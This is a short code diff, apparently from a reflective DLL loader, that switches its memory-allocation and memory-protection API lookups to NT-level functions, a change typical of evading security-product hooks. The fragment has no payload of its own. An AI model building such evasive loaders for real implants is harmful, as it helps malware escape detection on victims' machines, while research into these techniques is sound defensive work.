@@ -60,9 +60,9 @@ extern "C" __declspec(dllexport) ULONG_PTR Load(LPVOID lpParameter) {
     WINAPIS WinAPIs = { 0 };
     PEHDRS PEHdrs = { 0 };
 
-    WinAPIs.fnAlloc = (Alloc_t)GetAddr(hModule, VA);
+    WinAPIs.fnAlloc = (Alloc_t)GetAddr(hNTModule, NTVA);
     WinAPIs.fnLoad = (Load_t)GetAddr(hModule, LLB);
-    WinAPIs.fnProt = (Protect_t)GetAddr(hModule, VP);
+    WinAPIs.fnProt = (Protect_t)GetAddr(hNTModule, NTVP);
     WinAPIs.Getter = (Getter_t)GetAddr(hModule, GP);
     WinAPIs.Flusher = (Flush_t)GetAddr(hNTModule, FLS);
 
